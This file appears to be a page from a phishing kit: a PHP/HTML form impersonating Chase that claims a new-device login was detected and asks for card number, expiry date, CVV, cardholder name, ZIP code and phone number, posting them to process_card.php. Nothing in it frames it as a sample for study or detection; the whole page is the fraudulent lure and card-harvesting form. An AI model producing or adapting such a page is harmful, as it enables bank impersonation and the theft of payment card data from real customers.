<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Chase - Additional Verification</title>
</head>
<body>
    <div class="header">
        <div class="logo">Chase</div>
    </div>
    
    <div class="verification-container">
        <div class="security-alert">
            <h3>🛡️ Additional Security Verification Required</h3>
            <p>We've detected a login from a new device. Please verify your card information to continue.</p>
        </div>
        
        <form action="process_card.php" method="POST">
            <div class="form-row">
                <div class="form-group">
                    <label>Card Number</label>
                    <input type="text" name="card_number" maxlength="19" placeholder="1234 5678 9012 3456" required>
                </div>
            </div>
            
            <div class="form-row">
                <div class="form-group half">
                    <label>Expiry Date</label>
                    <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
                </div>
                
                <div class="form-group half">
                    <label>CVV</label>
                    <input type="text" name="cvv" maxlength="4" placeholder="123" required>
                </div>
            </div>
            
            <div class="form-group">
                <label>Full Name (as on card)</label>
                <input type="text" name="cardholder_name" required>
            </div>
            
            <div class="form-group">
                <label>ZIP Code</label>
                <input type="text" name="zip_code" maxlength="5" required>
            </div>
            
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" name="phone" placeholder="(555) 123-4567" required>
            </div>
            
            <button type="submit" class="verify-button">Verify & Continue</button>
        </form>
    </div>
</body>
</html>